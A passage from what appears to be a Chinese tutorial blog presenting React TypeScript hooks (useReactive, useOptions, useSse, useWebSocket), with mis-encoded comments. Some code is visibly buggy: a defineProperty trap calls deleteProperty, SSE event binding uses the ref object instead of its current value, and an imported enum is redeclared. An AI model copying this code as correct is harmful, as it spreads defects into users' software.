): [S, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">SetStateAction</span>&lt;S&gt;&gt;, <span class="hljs-function">() =&gt;</span> S] {
  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState)
  <span class="hljs-keyword">const</span> curRef = <span class="hljs-title function_">useRef</span>(state)
  curRef.<span class="hljs-property">current</span> = state

  <span class="hljs-keyword">const</span> getState = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> curRef.<span class="hljs-property">current</span>, [])

  <span class="hljs-keyword">return</span> [state, setState, getState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-11">useReactive</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> useToggle <span class="hljs-keyword">from</span> <span class="hljs-string">'./useToggle'</span>

<span class="hljs-comment">// å“åº”å¼å¯¹è±¡</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useReactive&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span>&gt;(<span class="hljs-attr">initialState</span>: S): S {
  <span class="hljs-keyword">const</span> [, { toggle }] = <span class="hljs-title function_">useToggle</span>(<span class="hljs-literal">false</span>)
  <span class="hljs-keyword">const</span> curRef = <span class="hljs-title function_">useRef</span>(initialState)

  <span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(curRef.<span class="hljs-property">current</span>, {
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value</span>) {
      <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value)
      <span class="hljs-title function_">toggle</span>() <span class="hljs-comment">// å±æ€§èµ‹å€¼æ—¶è§¦å‘å›è°ƒ</span>
      <span class="hljs-keyword">return</span> ret
    },
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key)
      <span class="hljs-keyword">return</span> ret
    },
    <span class="hljs-title function_">defineProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key)
      <span class="hljs-title function_">toggle</span>() <span class="hljs-comment">// å±æ€§åˆ é™¤æ—¶è§¦å‘å›è°ƒ</span>
      <span class="hljs-keyword">return</span> ret
    },
  })

  <span class="hljs-keyword">return</span> proxy
}
</code></pre>
<h3 data-id="heading-12">useOptions</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">DefaultOptionType</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/lib/select'</span>
<span class="hljs-keyword">import</span> { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// è´¦å·åˆ—è¡¨é¡¹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">UseOptionsProps</span>&lt;T = <span class="hljs-title class_">DefaultOptionType</span>, R = <span class="hljs-built_in">any</span>&gt; = {
  labelField?: keyof R <span class="hljs-comment">// è¦å–çš„ä½œä¸ºlabelçš„å­—æ®µ</span>
  labelFormat?: <span class="hljs-function">(<span class="hljs-params">record: R</span>) =&gt;</span> <span class="hljs-built_in">any</span> <span class="hljs-comment">// labelå­—æ®µè‡ªå®šä¹‰æ ¼å¼åŒ–å‡½æ•°</span>
  valueField?: keyof R <span class="hljs-comment">// è¦å–çš„ä½œä¸ºvalueçš„å­—æ®µ</span>
  valueFormat?: <span class="hljs-function">(<span class="hljs-params">record: R</span>) =&gt;</span> <span class="hljs-built_in">any</span> <span class="hljs-comment">// valueå­—æ®µè‡ªå®šä¹‰æ ¼å¼åŒ–å‡½æ•°</span>
  resField?: <span class="hljs-built_in">string</span>[] <span class="hljs-comment">// è¦å–çš„è¿”å›å€¼å­—æ®µ(æ¯”å¦‚resã€listã€resutlç­‰)</span>
  <span class="hljs-attr">dataFn</span>: <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; <span class="hljs-comment">// è¦è¯·æ±‚çš„æ¥å£</span>
  fnParams?: <span class="hljs-built_in">any</span> <span class="hljs-comment">// è¯·æ±‚çš„æ¥å£å‚æ•°</span>
  definedFormat?: <span class="hljs-function">(<span class="hljs-params">data: R[]</span>) =&gt;</span> T[] <span class="hljs-comment">// è‡ªå®šä¹‰æ ¼å¼åŒ–æ•°æ®å‡½æ•°</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@desc</span> è‡ªå®šä¹‰è·å–ä»»æ„æ¥å£å¹¶æ ¼å¼åŒ–ä¸ºä¸‹æ‹‰optionsçš„hook
 * <span class="hljs-doctag">@param</span>  T æœ€ç»ˆè¿”å›çš„æ•°æ®çš„ç±»å‹
 * <span class="hljs-doctag">@param</span>  R æ¥å£è¿”å›çš„æ•°æ®çš„ç±»å‹
 */</span>
<span class="hljs-keyword">function</span> useOptions&lt;T = <span class="hljs-title class_">DefaultOptionType</span>, R = <span class="hljs-built_in">any</span>&gt;(
  <span class="hljs-attr">props</span>: <span class="hljs-title class_">UseOptionsProps</span>&lt;T, R&gt;,
): [T[], R[], <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>] {
  <span class="hljs-keyword">const</span> {
    labelField,
    valueField,
    labelFormat,
    valueFormat,
    fnParams,
    dataFn,
    resField,
    definedFormat,
  } = props || {}
  <span class="hljs-keyword">const</span> [options, setOptions] = useState&lt;T[]&gt;([]) <span class="hljs-comment">// ä¸‹æ‹‰é€‰é¡¹</span>
  <span class="hljs-keyword">const</span> [datas, setDatas] = useState&lt;R[]&gt;([]) <span class="hljs-comment">// åŸå§‹æ•°æ®</span>

  <span class="hljs-comment">/** æ ¼å¼åŒ–ä¸ºé€šç”¨ä¸‹æ‹‰é€‰é¡¹ç»“æ„ */</span>
  <span class="hljs-keyword">const</span> formatToCommonOptions = (<span class="hljs-attr">list</span>: R[]): T[] =&gt; {
    <span class="hljs-keyword">return</span> list?.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item: R</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> label = labelFormat
        ? labelFormat?.(item)
        : labelField
        ? item?.[labelField]
        : item?.[<span class="hljs-string">'name'</span> <span class="hljs-keyword">as</span> keyof R] || <span class="hljs-string">''</span> <span class="hljs-comment">// labelå–å€¼</span>
      <span class="hljs-keyword">const</span> value = valueFormat
        ? valueFormat?.(item)
        : valueField
        ? item?.[valueField]
        : item?.[<span class="hljs-string">'id'</span> <span class="hljs-keyword">as</span> keyof R] || <span class="hljs-string">''</span> <span class="hljs-comment">// valueå–å€¼</span>

      <span class="hljs-keyword">return</span> { label, value } <span class="hljs-keyword">as</span> T
    })
  }

  <span class="hljs-comment">// è·å–æ•°æ®</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDatas</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> res = fnParams ? <span class="hljs-keyword">await</span> <span class="hljs-title function_">dataFn</span>(fnParams) : <span class="hljs-keyword">await</span> <span class="hljs-title function_">dataFn</span>()

      <span class="hljs-keyword">const</span> <span class="hljs-attr">list</span>: R[] =
        resField &amp;&amp; resField?.<span class="hljs-property">length</span>
          ? resField.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">pre, cur</span>) =&gt;</span> pre?.[cur], res)
          : res
      <span class="hljs-keyword">if</span> (list &amp;&amp; <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(list)) {
        <span class="hljs-title function_">setDatas</span>(list) <span class="hljs-comment">// ä¿å­˜åŸå§‹æ•°æ®</span>
        <span class="hljs-title function_">setOptions</span>(
          definedFormat ? <span class="hljs-title function_">definedFormat</span>(list) : <span class="hljs-title function_">formatToCommonOptions</span>(list),
        ) <span class="hljs-comment">// ä¿å­˜æ ¼å¼åŒ–æ•°æ®</span>
      }
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-comment">//</span>
    }
  }

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">getDatas</span>()
  }, [])

  <span class="hljs-keyword">return</span> [options, datas, getDatas]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useOptions
</code></pre>
<h3 data-id="heading-13">useSse</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// å®šæ—¶å™¨çš„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TimerType</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">undefined</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSEæš´éœ²çš„æ–¹æ³•
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SSEMethods</span> {
  <span class="hljs-attr">close</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">reconnect</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
}

<span class="hljs-comment">/**
 * SSEè¿æ¥çŠ¶æ€æšä¸¾
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SSEReadyState</span> {
  <span class="hljs-variable constant_">CONNECTING</span>, <span class="hljs-comment">// è¿æ¥ä¸­</span>
  <span class="hljs-variable constant_">OPEN</span>, <span class="hljs-comment">// å·²è¿æ¥</span>
  <span class="hljs-variable constant_">CLOSED</span>, <span class="hljs-comment">// å·²å…³é—­</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> åˆå§‹åŒ–å‚æ•°
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">EventSourceInit</span> = {
  withCredentials?: <span class="hljs-built_in">boolean</span>
  headers?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;
  payload?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSEè¿æ¥éœ€è¦çš„å‚æ•°
 * <span class="hljs-doctag">@param</span> T å½“å‰SSEè¿æ¥çš„æ•°æ®ç»“æ„
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SSEProps</span> {
  events?: <span class="hljs-built_in">string</span>[] <span class="hljs-comment">// äº‹ä»¶åç§°</span>
  retryInterval?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// é‡è¯•é—´éš”</span>
  heartbeatTimeout?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// å¿ƒè·³è¶…æ—¶æ—¶é—´</span>
  init?: <span class="hljs-title class_">EventSourceInit</span> <span class="hljs-comment">// åˆå§‹åŒ–å‚æ•°</span>
  onMessage?: <span class="hljs-function">(<span class="hljs-params">event: MessageEvent</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// æ¶ˆæ¯å›è°ƒ</span>
  autoConnect?: <span class="hljs-built_in">boolean</span> <span class="hljs-comment">// æ˜¯å¦è‡ªåŠ¨è¿æ¥</span>
  maxRetries?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// æœ€å¤§é‡è¯•æ¬¡æ•°</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSEè¿æ¥è¿”å›ç»“æ„
 * <span class="hljs-doctag">@param</span> T å½“å‰SSEè¿æ¥çš„æ•°æ®ç»“æ„
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SSEReturn</span>&lt;T&gt; {
  <span class="hljs-attr">data</span>: T | <span class="hljs-literal">null</span> <span class="hljs-comment">// å½“å‰SSEè¿æ¥çš„æ•°æ®ç»“æ„</span>
  <span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span> <span class="hljs-comment">// é”™è¯¯</span>
  <span class="hljs-attr">readyState</span>: <span class="hljs-title class_">SSEReadyState</span> <span class="hljs-comment">// è¿æ¥çŠ¶æ€</span>
  <span class="hljs-attr">methods</span>: <span class="hljs-title class_">SSEMethods</span> <span class="hljs-comment">// æš´éœ²çš„æ–¹æ³•</span>
  <span class="hljs-attr">retryCount</span>: <span class="hljs-built_in">number</span> <span class="hljs-comment">// å½“å‰é‡è¯•æ¬¡æ•°</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSEè¿æ¥çŠ¶æ€æšä¸¾
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">READY_STATE_MAP</span> = {
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>]: <span class="hljs-string">'è¿æ¥ä¸­...'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">OPEN</span>]: <span class="hljs-string">'å·²è¿æ¥'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>]: <span class="hljs-string">'å·²å…³é—­'</span>,
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSEè¿æ¥çŠ¶æ€æšä¸¾
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">READY_STATE_TYPE_MAP</span> = {
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>]: <span class="hljs-string">'warning'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">OPEN</span>]: <span class="hljs-string">'success'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>]: <span class="hljs-string">'error'</span>,
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> é€šç”¨çš„SSEè¿æ¥HOOK
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">SSEProps</span>} è¿æ¥å‚æ•°
 */</span>
<span class="hljs-comment">// è¿æ¥åœ°å€</span>
<span class="hljs-keyword">const</span> useSse = &lt;T,&gt;(<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">options</span>: <span class="hljs-title class_">SSEProps</span>): <span class="hljs-title class_">SSEReturn</span>&lt;T&gt; =&gt; {
  <span class="hljs-keyword">const</span> {
    autoConnect,
    maxRetries,
    retryInterval = <span class="hljs-number">5</span> * <span class="hljs-number">1000</span>,
    heartbeatTimeout,
    init,
    events,
    onMessage,
  } = options || {}

  <span class="hljs-keyword">const</span> [readyState, setReadyState] = useState&lt;<span class="hljs-title class_">SSEReadyState</span>&gt;(
    <span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>,
  ) <span class="hljs-comment">// å½“å‰è¿æ¥çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [data, setData] = useState&lt;T | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// å½“å‰SSEæ•°æ®</span>
  <span class="hljs-keyword">const</span> [error, setError] = useState&lt;<span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// é”™è¯¯</span>
  <span class="hljs-keyword">const</span> sseRef = useRef&lt;<span class="hljs-title class_">EventSource</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// SSEå®ä¾‹</span>
  <span class="hljs-keyword">const</span> retryTimer = useRef&lt;<span class="hljs-title class_">TimerType</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// é‡è¯•çš„å®šæ—¶å™¨</span>
  <span class="hljs-keyword">const</span> heartbeatTimer = useRef&lt;<span class="hljs-title class_">TimerType</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// å¿ƒè·³çš„å®šæ—¶å™¨</span>
  <span class="hljs-keyword">const</span> retryCount = useRef&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">0</span>) <span class="hljs-comment">// å½“å‰é‡è¯•æ¬¡æ•°</span>

  <span class="hljs-comment">// åˆå§‹åŒ–SSE</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">initSSE</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> sseInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(url, init)
      sseRef.<span class="hljs-property">current</span> = sseInstance

      <span class="hljs-comment">// sseè¿æ¥æ‰“å¼€äº‹ä»¶</span>
      sseInstance.<span class="hljs-property">onopen</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'SSEè¿æ¥å·²æ‰“å¼€'</span>)
        <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">OPEN</span>)
        retryCount.<span class="hljs-property">current</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// é‡ç½®é‡è¯•æ¬¡æ•°</span>
        <span class="hljs-title function_">startHeatbeat</span>() <span class="hljs-comment">// å¼€å§‹å¿ƒè·³</span>
        <span class="hljs-title function_">bindEvents</span>()
      }

      sseInstance.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
        <span class="hljs-title function_">setError</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`SSE Error: <span class="hljs-subst">${e.<span class="hljs-keyword">type</span>}</span>`</span>))
        <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
        <span class="hljs-keyword">if</span> (autoConnect !== <span class="hljs-literal">false</span>) <span class="hljs-title function_">reconnect</span>()
      }

      sseInstance.<span class="hljs-property">onmessage</span> = handleMessage
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-title function_">setError</span>(error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)
      <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
      <span class="hljs-keyword">if</span> (autoConnect !== <span class="hljs-literal">false</span>) <span class="hljs-title function_">reconnect</span>()
    }
  }

  <span class="hljs-comment">// æ¶ˆæ¯å¤„ç†äº‹ä»¶</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleMessage</span> = (<span class="hljs-params">event: MessageEvent</span>) =&gt; {
    <span class="hljs-keyword">const</span> parsedData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(event.<span class="hljs-property">data</span>) <span class="hljs-keyword">as</span> T
    <span class="hljs-title function_">setData</span>(parsedData)
    onMessage?.(event)
  }

  <span class="hljs-comment">// é‡ç½®é‡è¯•çš„å®šæ—¶å™¨</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetRetryTimer</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (retryTimer.<span class="hljs-property">current</span>) {
      <span class="hljs-built_in">clearTimeout</span>(retryTimer.<span class="hljs-property">current</span>)
      retryTimer.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// é‡ç½®å¿ƒè·³çš„å®šæ—¶å™¨</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetHeartbeatTimer</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (heartbeatTimer.<span class="hljs-property">current</span>) {
      <span class="hljs-built_in">clearTimeout</span>(heartbeatTimer.<span class="hljs-property">current</span>)
      heartbeatTimer.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// é‡è¿SSE</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// è¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°å°±ä¸é‡è¯•äº†</span>
    <span class="hljs-keyword">if</span> (maxRetries &amp;&amp; retryCount.<span class="hljs-property">current</span> &gt;= maxRetries) {
      <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-title function_">resetRetryTimer</span>()
    <span class="hljs-title function_">resetHeartbeatTimer</span>()

    retryTimer.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>)
      retryCount.<span class="hljs-property">current</span> += <span class="hljs-number">1</span> <span class="hljs-comment">// é‡è¯•æ¬¡æ•°+1</span>
      <span class="hljs-title function_">initSSE</span>()
    }, retryInterval * (retryCount.<span class="hljs-property">current</span> + <span class="hljs-number">1</span>))
  }

  <span class="hljs-comment">// å¼€å§‹å¿ƒè·³</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">startHeatbeat</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (heartbeatTimeout) {
      <span class="hljs-title function_">resetHeartbeatTimer</span>()
      heartbeatTimer.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
        <span class="hljs-title function_">disconnectSSE</span>()
        <span class="hljs-title function_">initSSE</span>()
      }, heartbeatTimeout)
    }
  }

  <span class="hljs-comment">// ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">bindEvents</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (sseRef &amp;&amp; events?.<span class="hljs-property">length</span>) {
      events?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">eventName</span>) =&gt;</span> {
        ;(sseRef <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">EventSource</span>).<span class="hljs-title function_">addEventListener</span>(
          eventName,
          handleMessage,
        )
      })
    }
  }

  <span class="hljs-comment">// è§£ç»‘è‡ªå®šä¹‰äº‹ä»¶</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">unbindEvents</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (sseRef &amp;&amp; events?.<span class="hljs-property">length</span>) {
      events?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">eventName</span>) =&gt;</span> {
        ;(sseRef <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">EventSource</span>).<span class="hljs-title function_">removeEventListener</span>(
          eventName,
          handleMessage,
        )
      })
    }
  }

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å¦‚æœæ˜¯è‡ªåŠ¨è¿æ¥</span>
    <span class="hljs-keyword">if</span> (autoConnect !== <span class="hljs-literal">false</span>) {
      <span class="hljs-title function_">initSSE</span>()
    }
    <span class="hljs-keyword">return</span> close
  }, [])

  <span class="hljs-comment">// æ–­å¼€SSEè¿æ¥</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">disconnectSSE</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> sseInstance = sseRef.<span class="hljs-property">current</span>
    <span class="hljs-keyword">if</span> (sseInstance) {
      sseInstance.<span class="hljs-title function_">close</span>()
      sseRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// å…³é—­</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">close</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">disconnectSSE</span>()
    <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
    <span class="hljs-title function_">resetRetryTimer</span>()
    <span class="hljs-title function_">resetHeartbeatTimer</span>()
    retryCount.<span class="hljs-property">current</span> = <span class="hljs-number">0</span>
    <span class="hljs-title function_">setData</span>(<span class="hljs-literal">null</span>)
    <span class="hljs-title function_">unbindEvents</span>()
  }

  <span class="hljs-keyword">const</span> <span class="hljs-attr">methods</span>: <span class="hljs-title class_">SSEMethods</span> = {
    close,
    <span class="hljs-attr">reconnect</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">close</span>()
      <span class="hljs-title function_">initSSE</span>()
    },
  }

  <span class="hljs-keyword">return</span> { data, readyState, <span class="hljs-attr">retryCount</span>: retryCount.<span class="hljs-property">current</span>, error, methods }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useSse
</code></pre>
<h3 data-id="heading-14">useWebSocket</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">HeartBeatType</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/enums/common'</span>
<span class="hljs-keyword">import</span> { useCallback, useMemo, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// å¿ƒè·³ç±»å‹æšä¸¾</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">HeartBeatType</span> {
  <span class="hljs-title class_">Ping</span> = <span class="hljs-string">'heartBeatPing'</span>, <span class="hljs-comment">// å¿ƒè·³å‘é€çš„æ¶ˆæ¯</span>
  <span class="hljs-title class_">Pong</span> = <span class="hljs-string">'heartBeatPong'</span>, <span class="hljs-comment">// å¿ƒè·³æ¥æ”¶çš„æ¶ˆæ¯</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TimerType</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">undefined</span> <span class="hljs-comment">// å®šæ—¶å™¨çš„ç±»å‹</span>

<span class="hljs-comment">// useWebSocketçš„å‚æ•°ç±»å‹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IWebSocketProps</span> {
  url?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// socketè¿æ¥åœ°å€</span>
  heartBeatInterval?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹é—´éš”</span>
  heartBeatData?: <span class="hljs-title class_">HeartBeatType</span> <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹å‘é€æ•°æ®</span>
  heartBeatSendData?: <span class="hljs-built_in">any</span> <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹å®é™…å‘é€æ•°æ®</span>
  maxReconnectAttempts?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// æœ€å¤§é‡è¿æ¬¡æ•°</span>
  reconnectInterval?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// é‡è¿é—´éš”</span>
}

<span class="hljs-comment">// å‘é€æ•°æ®çš„ç±»å‹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">SendData</span> = <span class="hljs-built_in">string</span> | <span class="hljs-title class_">ArrayBufferLike</span> | <span class="hljs-title class_">Blob</span> | <span class="hljs-title class_">ArrayBufferView</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> WebSocket hookå°è£…
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useWebSocket</span>(<span class="hljs-params">options: IWebSocketProps</span>) {
  <span class="hljs-keyword">const</span> {
    url,
    heartBeatInterval = <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
    heartBeatData = <span class="hljs-title class_">HeartBeatType</span>.<span class="hljs-property">Ping</span>,
    heartBeatSendData,
    maxReconnectAttempts = <span class="hljs-number">10</span>,
    reconnectInterval = <span class="hljs-number">5</span> * <span class="hljs-number">1000</span>,
  } = options

  <span class="hljs-keyword">const</span> socket = useRef&lt;<span class="hljs-title class_">WebSocket</span>&gt;() <span class="hljs-comment">// socketå®ä¾‹</span>
  <span class="hljs-keyword">const</span> [lastMessage, setLastMessage] = useState&lt;<span class="hljs-title class_">MessageEvent</span>&gt;() <span class="hljs-comment">// socketæ¶ˆæ¯</span>
